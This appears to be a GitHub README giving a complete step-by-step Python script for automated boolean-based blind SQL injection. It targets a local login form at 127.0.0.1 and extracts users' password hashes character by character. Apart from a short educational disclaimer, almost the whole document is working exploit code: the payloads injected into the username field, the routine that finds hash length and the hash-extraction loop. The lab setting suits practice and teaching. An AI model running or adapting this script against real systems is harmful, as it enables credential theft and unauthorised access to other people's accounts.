# Exploiting-SQL-Injection

## Disclaimer
_This script is provided for educational purposes only._

_It is designed to demonstrate SQL injection techniques in a controlled, authorized environment._

_Using this script or similar techniques against systems without explicit permission is illegal and unethical._

_Always practice responsible and ethical hacking, and only use such tools on systems you own or have explicit permission to test._

<br>

## Screenshots:

<img width="788" alt="Screenshot 2024-11-04 123950" src="https://github.com/user-attachments/assets/39409efc-40f9-4f61-937b-0e1676b66c2a">

<br>

## Steps to perform an automated SQL Injection:

#### Step 1: Import the required library
    import requests
<br>

#### Step 2: Set up initial variables
    total_queries = 0
    charset = "0123456789abcdef"
    target = "http://127.0.0.1:5000"
    needle = "Welcome back"
<br>

#### Step 3: Create the injected_query function to send POST requests
    def injected_query(payload):
        global total_queries
        r = requests.post(target, data={"username": "admin' and {}--".format(payload), "password": "password"})
        total_queries += 1
        return needle.encode() not in r.content
<br>

#### Step 4: Implement boolean_query function for binary search
    def boolean_query(offset, user_id, character, operator=">"):
        payload = "(select hex(substr(password, {}, 1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
        return injected_query(payload)

<br>

#### Step 5: Create helper functions
    def invalid_user(user_id):
        payload = "(select id from user where id = {}) >=0".format(user_id)
        return injected_query(payload)

    def password_length(user_id):
        i = 0
        while True:
            payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
            if not injected_query(payload):
                return i
            i += 1

    def total_queries_taken():
        global total_queries
        print("\t\t[!] {} total queries!".format(total_queries))
        total_queries = 0

<br>

#### Step 6: Implement the extract_hash function to retrieve the password hash
    def extract_hash(charset, user_id, password_length):
        found = ""
        for i in range(0, password_length):
            for j in range(len(charset)):
                if boolean_query(i, user_id, charset[j]):
                    found += charset[j]
                    break
        return found
<br>

#### Step 7: Create the main loop to interact with the user
    while True:
        try:
            user_id = input("> Enter a user ID to extract the password hash: ")
            if not invalid_user(user_id):
                user_password_length = password_length(user_id)
                print("\t [-] User {} hash length: {}".format(user_id, user_password_length))
                total_queries_taken()
                print("\t [-] User {} hash: {}".format(user_id,extract_hash(charset, int(user_id),user_password_length)))
                total_queries_taken()
            else:
                print("\t [X] User {} does not exists!".format(user_id))
        except KeyboardInterrupt:
            break
<br>
<hr>
